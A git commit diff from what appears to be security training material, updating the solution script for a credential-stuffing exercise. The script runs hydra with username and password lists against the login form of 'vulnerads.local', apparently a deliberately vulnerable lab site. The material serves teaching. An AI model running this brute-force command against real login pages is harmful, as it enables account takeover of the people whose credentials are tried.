67e059d457cc67ba0d8a6927972144eb9e5d62e3
Oskar <oskar.zeino@viadee.de>
2022-03-14 18:43:33 +0100

    fixed credential stuffing solution

--- exercise_material/solutions/05_credential_stuffing/credential_stuffing_solution.sh
+++ exercise_material/solutions/05_credential_stuffing/credential_stuffing_solution.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
 
-hydra -L ./benutzernamen_loesung.txt -P ./passwords.txt "vulnerads.local" http-post-form "/login:username=^USER^&password=^PASS^:Benutzername oder Passwort falsch!" -V -F
+hydra -SFV -L ./benutzernamen_loesung.txt -P ./passwords.txt "vulnerads.local" http-post-form "/login:username=^USER^&password=^PASS^:Benutzername oder Passwort falsch!"
